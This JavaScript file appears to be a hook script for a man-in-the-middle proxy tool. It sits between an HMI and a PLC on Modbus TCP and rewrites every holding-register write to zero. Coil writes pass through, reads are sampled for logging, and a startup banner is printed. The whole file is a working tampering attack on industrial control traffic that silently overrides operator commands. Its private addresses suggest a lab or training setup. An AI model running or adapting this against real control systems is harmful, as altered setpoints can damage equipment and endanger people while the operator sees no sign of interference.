function pad(n, width, z) {
  z = z || '0';
  n = n + '';
  return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
}

function onData(from, to, data) {
  if (data.length >= 12) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];

    // Function Code 6: Write Single Holding Register - BLOCK ALL
    if (functionCode == 6) {
      var regAddr = (data[8] << 8) | data[9];
      var regValue = (data[10] << 8) | data[11];

      log("╔═══[" + time + "]═══[REGISTER WRITE INTERCEPTED]═══╗");
      log("║ Direction: " + (from.indexOf(".11") !== -1 ? "HMI → PLC" : "PLC → HMI"));
      log("║ Source: " + from);
      log("║ Function Code: 6 (Write Single Holding Register)");
      log("║ Register Address: " + regAddr + " (0x" + pad(regAddr.toString(16), 4) + ")");
      log("║ Original Value: " + regValue + " (0x" + pad(regValue.toString(16), 4) + ")");
      log("╠═══════════════════════════════════════════════════╣");
      log("║ [+] ACTION: BLOCKING - Setting value to 0x0000 ║");
      log("╚═══════════════════════════════════════════════════╝");

      // Set register value to 0
      data[10] = 0x00;
      data[11] = 0x00;

      // Return modified packet
      return data;
    }
    // Function Code 5: Write Single Coil - ALLOW ALL
    else if (functionCode == 5) {
      var coilAddr = (data[8] << 8) | data[9];
      var coilValue = (data[10] << 8) | data[11];

      // Log coil writes for visibility
      log("┌─[" + time + "]─[COIL WRITE]────");
      log("│ Source: " + from);
      log("│ Coil Address: " + coilAddr);
      log("│ Value: 0x" + pad(coilValue.toString(16), 4) + (coilValue == 0xFF00 ? " (TRUE)" : " (FALSE)"));
      log("│ [+] ACTION: ALLOWED - Passing through");
      log("└────────────────────────────────");
    }
    // Function Code 3: Read Holding Registers - Monitor sparingly
    else if (functionCode == 3) {
      // Only log 1% of read operations to reduce noise
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " registers from address " + startAddr);
      }
    }
    // Function Code 1: Read Coils - Monitor sparingly
    else if (functionCode == 1) {
      // Only log 1% of read operations
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " coils from address " + startAddr);
      }
    }
  }

  return data;
}

// Startup banner
log("");
log("╔═══════════════════════════════════════════════════╗");
log("║ HOLDING REGISTER WRITE BLOCKER ACTIVE ║");
log("╠═══════════════════════════════════════════════════╣");
log("║ Configuration: ║");
log("║ • Blocking ALL holding register writes (FC6) ║");
log("║ • Setting all register values to 0x0000 ║");
log("║ • Allowing ALL coil operations ║");
log("║ • Allowing ALL read operations ║");
log("╠═══════════════════════════════════════════════════╣");
log("║ Target: 192.168.1.120 (PLC) ║");
log("║ Source: 192.168.1.11 (HMI) ║");
log("╚═══════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");